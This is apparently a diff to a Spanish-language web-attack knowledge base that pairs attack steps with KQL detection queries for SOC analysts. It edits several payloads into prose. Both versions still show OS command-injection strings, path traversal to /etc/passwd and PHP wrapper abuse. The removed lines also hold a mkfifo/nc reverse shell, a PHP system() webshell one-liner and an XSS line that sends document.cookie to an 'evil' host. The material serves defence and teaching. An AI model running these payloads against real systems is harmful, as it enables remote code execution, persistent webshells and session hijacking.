@@ -135,7 +135,7 @@ export const WEB_ATTACKS: AttackInfo[] = [
       'Localizar el sink: funcionalidades que llaman al OS (ping diagnóstico, conversores, nombres de archivo en backups, generadores de PDF)',
       'Romper la sintaxis: "127.0.0.1; whoami", "&& id", "$(id)", backticks `id` — comparar respuestas',
       'A ciegas: "127.0.0.1 && sleep 10" (timing) o "|| curl http://collab.oastify.com" (OOB con Burp Collaborator)',
-      'Shell inversa y automatización: rm /tmp/f → mkfifo /tmp/f → cat /tmp/f | /bin/sh -i 2>&1 | nc {IP} 4444 > /tmp/f — o commix -u "http://target/ping?ip=127.0.0.1"',
+      'Shell inversa y automatización: crear un FIFO con mkfifo, leerlo con cat y entregarlo a una shell interactiva (sh -i, stderr incluido) cuyo output va a un listener nc en {IP}:4444 que devuelve la salida al FIFO — o automatizar con commix -u "http://target/ping?ip=127.0.0.1"',
     ],
     deteccion: {
       kql: 'DeviceProcessEvents | where InitiatingProcessFileName in ("w3wp.exe", "php-cgi.exe", "php-fpm", "node", "java.exe", "httpd") and FileName in ("cmd.exe", "powershell.exe", "whoami.exe", "ping.exe", "nslookup.exe", "nc.exe") | project Timestamp, FileName, ProcessCommandLine',
@@ -166,7 +166,7 @@ export const WEB_ATTACKS: AttackInfo[] = [
       'Identificar el parámetro de ruta: ?file=report.pdf → reemplazar por ../../../../etc/passwd y comparar respuestas',
       'Bypass de filtros: %2e%2e%2f, ..%2f, ....//, encoding UTF-16 o null byte (file=../../etc/passwd%00.jpg en PHP < 5.3.4)',
       'Wrappers PHP: php://filter/convert.base64-encode/resource=index.php (fuente en base64), data://text/plain;base64,... (RCE si allow_url_include)',
-      'Post-LFI a shell: log poisoning (User-Agent con ‹?php system($_GET["c"]); ?› → incluir /var/log/apache2/access.log) o sesiones (/var/lib/php/sessions)',
+      'Post-LFI a shell: log poisoning (User-Agent con un one-liner PHP que llama a system() leyendo el parámetro GET c → incluir /var/log/apache2/access.log) o sesiones (/var/lib/php/sessions)',
     ],
     deteccion: {
       kql: 'AppHttpRequest | where Url contains "../" or Url contains "%2e%2e" or Url contains "....//" or Url contains "php://" or Url contains "/etc/passwd" | summarize count() by SourceIp, Url | where count_ > 3',
@@ -226,7 +226,7 @@ export const WEB_ATTACKS: AttackInfo[] = [
     impacto_iam_soc: 'Es el vector #1 hacia webshell y RCE en apps con upload (CMS, gestores documentales, avatares). En SOC: archivos con doble extensión o Content-Type image/* con contenido ejecutable, y POSTs extraños al archivo recién subido.',
     como_funciona: [
       'Mapear las validaciones: probar extensiones (php, php5, phtml, jsp, jspx, aspx, ashx, war), Content-Types y renombres con Burp Repeater',
-      'Bypass: GIF89a‹?php system($_GET["c"]); ?› subido como avatar.gif con Content-Type image/gif (magic bytes + código)',
+      'Bypass: magic bytes GIF89a seguidos del one-liner PHP (system() + parámetro GET), subido como avatar.gif con Content-Type image/gif',
       'Plantar .htaccess (AddType application/x-httpd-php .jpg) en Apache o usar rutas con extensión doble / null byte en stacks legacy',
       'Verificar ejecución: GET /uploads/avatar.gif?c=whoami — o backdoors ofuscados en metadatos con weevely (genera polyglots)',
     ],
@@ -256,10 +256,10 @@ export const WEB_ATTACKS: AttackInfo[] = [
     descripcion_tecnica: 'Código plantado en el servidor (PHP/JSP/ASPX) que ejecuta comandos arbitrarios vía HTTP. Es el ARTEFACTO de persistencia post-compromiso — el VECTOR de entrada ya es WEB-007 (upload) o un RCE/deserialización de tercero. Un one-liner basta: ‹?php system($_GET["c"]); ?›. Familias avanzadas: China Chopper (script servidor de ~4KB con cliente GUI, base64 en cookie), WSO/b374k (file manager + SQL client), Behinder/AntSword (cifrado AES, .NET/Java).',
     impacto_iam_soc: 'Terminal HTTP sobre el servidor web con los privilegios del pool — persistencia silenciosa durante meses si nadie audita el webroot. En SOC: China Chopper tiene firma de tráfico (POST corto, UA peculiar), requests al mismo .php con params base64/hex y procesos hijos del servicio web.',
     como_funciona: [
-      'Plantar (vía WEB-007, RCE o FTP débil): ‹?php echo shell_exec($_GET["c"]); ?› guardado como footer.php en el tema del CMS',
+      'Plantar (vía WEB-007, RCE o FTP débil): la variante con shell_exec() en lugar de system(), guardada como footer.php en el tema del CMS',
       'Operar: GET /footer.php?c=whoami — o el cliente de China Chopper (comando via cookie codificada) para stealth',
       'Empaquetar en extensiones no obvias (.ashx handler en web.config, .jspx en Tomcat, .jpg + .htaccess) para sobrevivir hunts de extensiones',
-      'Encubrir: inyectar el código en un archivo legítimo (append al footer.php real del tema) y ofuscar con eval(gzinflate(base64_decode(...)))',
+      'Encubrir: inyectar el código en un archivo legítimo (append al footer.php real del tema) y ofuscarlo con la cadena eval → gzinflate → base64_decode (el sello clásico de los webshells PHP ofuscados)',
     ],
     deteccion: {
       kql: 'DeviceProcessEvents | where InitiatingProcessFileName in ("w3wp.exe", "httpd", "php-fpm", "php-cgi.exe", "tomcat", "java.exe") and FileName in ("cmd.exe", "powershell.exe", "whoami.exe", "net.exe", "certutil.exe") | project Timestamp, FileName, ProcessCommandLine',
@@ -352,7 +352,7 @@ export const WEB_ATTACKS: AttackInfo[] = [
     descripcion_tecnica: 'El atacante obtiene el identificador de sesión de la víctima (cookie JSESSIONID/PHPSESSID, token bearer) y lo replica en su propio navegador: el servidor no distingue quién sostiene el token. Vectores: XSS (document.cookie sin HttpOnly), sniffing de red (HTTP sin TLS/HSTS), AiTM con proxy de login (Evilginx), tokens en URLs (leak por Referer) e infostealers.',
     impacto_iam_soc: 'Suplantación total SIN contraseña y con MFA ya satisfecho (la sesión está autenticada — bypass perfecto). En SOC: el mismo session id desde IP/ASN/user-agent distintos en ventana corta, sesiones simultáneas divergentes, impossible travel.',
     como_funciona: [
-      'Capturar el token: XSS (‹script›fetch("//evil/?c="+document.cookie)‹/script›), Evilginx proxyando el login, o captura de red sobre HTTP',
+      'Capturar el token: XSS que hace fetch hacia el dominio del atacante llevándose document.cookie (si falta HttpOnly), Evilginx proxyando el login, o captura de red sobre HTTP',
       'Clonar la sesión en el navegador del atacante: Burp Cookie Jar o extensión Cookie-Editor con el token robado',
       'Persistir: refresh tokens / remember-me de larga vida, o adaptar el fingerprint (Evilginx inyecta el JS de la víctima)',
       'Acciones: exfiltrar correo y documentos, cambiar el email de recuperación (lockout del dueño), pivot a password reset de terceros',
